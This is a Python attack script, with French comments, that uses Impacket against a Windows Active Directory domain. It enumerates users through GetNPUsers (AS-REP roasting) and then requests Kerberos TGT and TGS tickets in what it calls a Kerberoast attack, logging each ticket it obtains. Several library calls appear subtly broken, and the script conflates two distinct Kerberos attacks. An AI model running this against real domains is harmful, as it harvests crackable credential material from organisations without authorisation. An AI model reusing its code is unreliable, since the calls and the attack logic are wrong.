from impacket.examples import GetNPUsers, GetUserSPNs
from impacket import version
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
import argparse
import logging
import sys

# Initialisation du logger Impacket
logging.getLogger().setLevel(logging.INFO)
logging.basicConfig(format='%(asctime)s %(levelname)-8s %(message)s')

def enumerate_users(target_domain):
    """
    Enumère les utilisateurs du domaine susceptible d'être vulnérables à Kerberoast.
    """
    logging.info("Tentative d'énumération des utilisateurs avec GetNPUsers...")
    try:
        get_np_users = GetNPUsers.GetNPUsers(target_domain)
        users = get_np_users.run()
        if users:
            logging.info(f"Utilisateurs trouvés: {users}")
            return users
        else:
            logging.info("Aucun utilisateur vulnérable trouvé avec GetNPUsers.")
            return []
    except Exception as e:
        logging.error(f"Erreur lors de l'énumération des utilisateurs: {str(e)}")
        return []

def kerberoast(target_domain, users):
    """
    Exécute l'attaque Kerberoast sur une liste d'utilisateurs.
    """
    vulnerable_users = []
    for user in users:
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(Principal(user, type=1), '', target_domain, None, None, None)
            tgs = getKerberosTGS(target_domain, '', target_domain, tgt, cipher, oldSessionKey, sessionKey)
            logging.info(f"Ticket obtenu pour {user}: {tgs}")
            vulnerable_users.append(user)
        except Exception as e:
            logging.info(f"{user} n'est pas vulnérable ou erreur: {str(e)}")
    return vulnerable_users

def main(target_domain):
    """
    Point d'entrée principal du script de test de sécurité Kerberos.
    """
    logging.info(f"Début du test de sécurité Kerberos pour le domaine {target_domain}")

    # Étape 1: Énumération des utilisateurs
    users = enumerate_users(target_domain)

    # Étape 2: Exploitation de Kerberoast
    if users:
        vulnerable_users = kerberoast(target_domain, users)
        logging.info(f"Utilisateurs vulnérables à Kerberoast: {vulnerable_users}")
    else:
        logging.info("Aucun utilisateur à tester pour Kerberoast.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Script de test de sécurité Kerberos amélioré avec Impacket")
    parser.add_argument('-d', '--domain', required=True, help='Nom de domaine cible pour le test')
    args = parser.parse_args()
    main(args.domain)
